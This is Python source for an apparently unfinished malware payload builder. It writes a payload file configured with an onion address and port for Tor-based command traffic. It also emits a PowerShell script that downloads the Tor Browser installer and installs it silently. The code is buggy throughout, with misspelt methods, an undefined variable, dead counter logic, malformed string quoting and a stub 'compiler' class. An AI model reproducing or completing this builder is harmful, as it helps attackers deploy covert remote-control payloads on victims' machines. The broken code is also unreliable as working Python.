class Generator:
    def __init__(self,payload,port,addr,outfile="payload.py"):
        self.payload = payload
        self.port = port
        self.addr = addr
        self.outfile = outfile

    def createPaylad(self):
        counter = 0
        f = open(self.outfile,'w')
        for lines in open(payload):
            if lines.statswith("#const"):
                counter = 2
                continue
            if counter == 2:
                f.write("OnionUrl = " + self.addr)
                continue
            if counter == 1:
                f.write("PORT = " + self.port)
                continue
            f.write(lines)
        f.close()

    def AddDownloadTor(self):
        f = open(self.outfile,'w+')        
        f.write("""
        $source = 'C:\source' 

If (!(Test-Path -Path $source -PathType Container)) {New-Item -Path $source -ItemType Directory | Out-Null} 

$packages = @( 
@{title='tor-browser';url='https://www.torproject.org/dist/torbrowser/7.0.1/torbrowser-install-7.0.1_en-US.exe';Arguments=' /S';Destination=$source}
) 


foreach ($package in $packages) { 
        $packageName = $package.title 
        $fileName = Split-Path $package.url -Leaf 
        $destinationPath = $package.Destination + "\" + $fileName 

If (!(Test-Path -Path $destinationPath -PathType Leaf)) { 

    Write-Host "Downloading $packageName" 
    $webClient = New-Object System.Net.WebClient 
    $webClient.DownloadFile($package.url,$destinationPath) 
    } 
    }

 
#Once we've downloaded all our files lets install them. 
foreach ($package in $packages) { 
    $packageName = $package.title 
    $fileName = Split-Path $package.url -Leaf 
    $destinationPath = $package.Destination + "\" + $fileName 
    $Arguments = $package.Arguments 
    Write-Output "Installing $packageName" 


Invoke-Expression -Command "$destinationPath $Arguments" 
}
        """)
        f.write("f = open('DownloadTor.ps1,'w')'")
        f.write("f.write(psfile)")
        f.close()


class compiler:
    def __init__(self,infile,outfileformat,os):
        print("hopefully do stuff")
            
    
